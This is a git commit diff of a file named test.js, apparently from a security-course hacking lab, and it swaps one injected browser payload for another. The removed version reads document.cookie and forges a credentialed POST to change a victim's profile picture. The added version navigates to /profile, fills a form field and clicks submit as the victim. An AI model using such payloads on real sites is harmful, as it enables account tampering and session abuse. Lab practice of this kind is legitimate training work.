a498afe2940f1c7d681a4b7fdd781ecbba840154
FernandoLomazzi <78239004+FernandoLomazzi@users.noreply.github.com>
2024-10-19 17:41:42 -0300

    Update test.js

--- test.js
+++ test.js
@@ -1,30 +1,3 @@
-async function cambiarImagen() {
-    const url = 'https://chl-ad0dc653-d267-4760-b281-fe3a2a80e455-blog-hacklab.softwareseguro.com.ar/profile';
-    const formData = new FormData();
-    formData.append('bio', 'None');
-    const emptyFile = new Blob([], { type: 'application/octet-stream' });
-    formData.append('profile_pic', emptyFile, ''); 
-
-    const cookie = document.cookie;
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Cookie': cookie,
-            },
-            body: formData,
-            credentials: 'include' 
-        });
-
-        if (response.ok) {
-            const responseData = await response.json();
-            console.log('Hackea2:', responseData);
-        } else {
-            console.error('NoHackea2:', response.statusText);
-        }
-    } catch (error) {
-        console.error('Error del fetch:', error);
-    }
-}
-
-cambiarImagen();
+window.location = "/profile";
+document.getElementsByTagName('input')[0].value = "hola";
+document.getElementsByTagName('button')[0].click();
